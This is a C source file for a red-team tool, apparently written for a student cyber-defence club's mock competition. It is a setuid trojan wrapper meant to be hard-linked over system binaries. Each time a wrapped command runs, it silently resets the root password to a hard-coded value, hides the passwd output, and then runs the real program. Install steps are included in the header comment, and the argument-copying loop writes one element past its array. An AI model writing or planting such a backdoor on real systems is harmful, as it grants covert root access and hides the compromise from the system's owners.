/*
 * Changes a users password and then invokes the command that this utilty was
 * executed as. The actual binary of the replaced file should be located in the
 * directory specified at REALPATH. Sort of, but not really, like busybox.
 *
 * Written for JMU Cyber Defense Club's mock CCDC competition.
 *
 * How to use:
 *  - compile (gcc baddybox.c -o busybox)
 *  - mkdir REALPATH
 *  - cp busybox REALPATH/busybox
 *  - chmod +s REALPATH/busybox
 *  - foreach binary:
 *    - cp binary REALPATH
 *    - ln REALPATH/busybox binary
 */

#include <libgen.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define REALPATH "/var/lib/busybox"
#define MAXPATHLEN 50
#define PASSWORD "redteamrocks"
#define DEBUG 0  // Set to 1 to enable debug output

int main(int argc, char **argv) {
    /* Preserve the orginal UID for when the actual utility gets called */
    uid_t uid = getuid();

    /* Set the uid to match the euid so that passwd doesn't drop privileges */
    setuid(0);

    /*
     * Open /dev/null. This will allow us to set the passwd utilitie's stdout
     * and stderr to /dev/null. If we just close them, the exec()-ed process
     * will just reopen them and that's not ideal. The user will get output
     * from passwd in addition to the expected output from ls(1) or whatever.
     */
    int dev_null_fd = open("/dev/null", O_WRONLY);

    /*
     * Set up basic IPC so that the desired password can be send to the passwd
     * utility
     */
    int pipefd[2];
    pipe(pipefd);
    char *str = PASSWORD "\n" PASSWORD "\n";
    int len = strlen(str);
    write(pipefd[1], str, len);

    /*
     * The child will be responsible for changing the password of the root
     * user. The parent will be responsible for calling the program that the
     * user expected to run.
     */
    pid_t pid = fork();
    if (pid == 0) {
        /*
         * Pass the data from the pipe on to stdin for passwd and then we can
         * close both ends of the pipe.
         */
        close(pipefd[1]);
        dup2(pipefd[0], STDIN_FILENO);
        close(pipefd[0]);

        /*
         * Effectively close stdout and stderr for passwd without actually
         * closing them.
         */

#if !(DEBUG)
        dup2(dev_null_fd, STDOUT_FILENO);
        dup2(dev_null_fd, STDERR_FILENO);
#endif // !DEBUG

        /* Create an array of arguments necessary for exec()-ing */
        char *args[] = { "passwd", NULL };
        execvp(args[0], args);

        /* Only reachable if execing passwd failed */
        exit(EXIT_FAILURE);
    } else {
        /* Neither pipe end is necessary anymore in the parent */
        close(pipefd[0]);
        close(pipefd[1]);

        setuid(uid);
        seteuid(uid);

        /*
         * Get the full path to the binary the user intended.
         */
        char full_path[MAXPATHLEN];
        char *binary = basename(argv[0]);
        snprintf(full_path, MAXPATHLEN, "%s/%s", REALPATH, binary);

        // Do not run infinitely
        if (strcmp(full_path, REALPATH "/busybox") == 0) {
            exit(EXIT_FAILURE);
        }

        /*
         * Copy the new path to argv[0] and then pass on all remaining args
         * to the target program
         */
        char *args[argc];
        args[0] = full_path;
        for (size_t i = 1; i <= argc; i++) {
            args[i] = argv[i];
        }

#if DEBUG
        printf("Executing:\n ");
        for (size_t i = 0; i < argc - 1; i++) {
            printf("%s ", args[i]);
        }
#endif // DEBUG

        execvp(args[0], args);

        /* Only reachable if execing desired file fails */
        exit(EXIT_FAILURE);
    }

    /* Definitely should never be reached. */
    exit(EXIT_FAILURE);
}
